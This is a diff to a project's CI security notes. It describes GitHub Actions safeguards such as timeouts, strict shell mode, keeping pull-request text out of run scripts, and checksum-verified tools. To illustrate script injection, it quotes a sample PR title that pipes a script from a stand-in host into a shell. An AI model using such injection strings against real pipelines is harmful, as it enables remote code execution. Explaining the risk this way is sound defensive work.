@@ -254,7 +254,7 @@ concurrency:
 ### `timeout-minutes`
 
 - **Guards against.** A stuck step running for hours. GitHub's default
-  limit is six hours. Ours is ten minutes.
+  limit is six hours. Ours are five to fifteen minutes.
 
 ### `set -euo pipefail` in every `run:` step
 
@@ -272,9 +272,11 @@ concurrency:
   that text into the script before it runs.
 - **Guards against.** **Script injection.** A title like
   `"; curl evil.sh | sh; "` would run as code. Passing values as `env:`
-  variables keeps them as plain data. Our workflows don't use such inputs
-  at all; the only `${{ }}` values are in `concurrency:` names, where they
-  are not run as code.
+  variables keeps them as plain data. Our workflows never put such inputs
+  in a `run:` script. The `${{ }}` values they use sit in `concurrency:`
+  names, `if:` conditions and `env:`, where they are not run as code, and
+  none is text a pull request author can type (the base branch name, job
+  results, the repo name).
 
 ### Checksum-verified tools
 
